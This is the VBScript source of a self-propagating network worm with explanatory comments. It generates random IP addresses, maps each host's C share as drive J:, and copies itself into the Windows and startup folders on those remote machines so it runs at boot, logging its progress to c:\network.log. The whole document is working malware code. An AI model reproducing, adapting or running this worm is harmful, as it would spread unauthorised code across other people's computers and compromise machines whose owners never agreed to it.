dim octa
dim octb
dim octc
dim octd
dim rand
dim dot
dim driveconnected
dim sharename
dim count
dim myfile        ' Creates a bunch of variables.
count = "0"
dot = "."
driveconnected="0"
set wshnetwork = wscript.createobject("wscript.network")
Set fso1 = createobject("scripting.filesystemobject")
set fso2 = createobject("scripting.filesystemobject") ' Sets a bunch of variables.
on error resume next
randomize
checkfile()       ' Erases and then re-creates its log file, c:\network.log.
randaddress()     ' Generates a random Class C subnet address (that's a block of 255 addresses).
checkaddress()    ' Increments the IP address by one; and creates a new random subnet if this one's been covered.
shareformat()     ' Creates a textstring, using the current IP address, which will be used to map a shared drive.
wshnetwork.mapnetworkdrive "j:", sharename ' Maps the shared drive to J:, blindly assuming there's one at the address.
enumdrives()      ' Checks to see if it's successfully mapped the drive.
copyfiles()       ' Places a copy of itself in several places on the drive (someone else's machine someplace).
disconnectdrive() ' Drops the connection.
msgbox "Done"

function disconnectdrive()
wshnetwork.removenetworkdrive "j:"
driveconnected = "0"
end function

function createlogfile()
Set myfile = fso1.createtextfile("c:\network.log", True)
end function

function checkfile()
If (fso1.fileexists("c:\network.log")) then
fso1.deletefile("c:\network.log")
createlogfile()
else
createlogfile()
end If
myfile.writeLine("Log file Open")
end function

function copyfiles()
myfile.writeline("Copying files to : " & sharename)
Set fso = CreateObject("scripting.filesystemobject")

fso.copyfile "c:\network.vbs", "j:\"

If (fso2.FileExists("j:\network.vbs")) Then
myfile.writeline("Successfull copy to : " & sharename)
End If 

fso.copyfile "c:\network.vbs", "j:\windows\startm~1\programs\startup\"

fso.copyfile "c:\network.vbs", "j:\windows\"

fso.copyfile "c:\network.vbs", "j:\windows\start menu\programs\startup\"

fso.copyfile "c:\network.vbs", "j:\win95\start menu\programs\startup\"

fso.copyfile "c:\network.vbs", "j:\win95\startm~1\programs\startup\"

fso.copyfile "c:\network.vbs", "j:\wind95\"

end function

function checkaddress()
octd = octd + 1
if octd = "255" then randaddress()
end function

function shareformat()
sharename = "\\" & octa & dot & octb & dot & octc & dot & octd & "\C"
end function

function enumdrives()
Set odrives = wshnetwork.enumnetworkdrives
For i = 0 to odrives.Count -1
if sharename = odrives.item(i) then
driveconnected = 1
else
' driveconnected = 0 
end if
Next
end function

function randum()
rand = int((254 * rnd) + 1)
end function

function randaddress()
if count > 50 then
octa=Int((16) * Rnd + 199)
count=count + 1
else
octa="255"
end if
randum()
octb=rand
randum()
octc=rand
octd="1"
myfile.writeLine("Subnet : " & octa & dot & octb & dot & octc & dot & "0")
end function

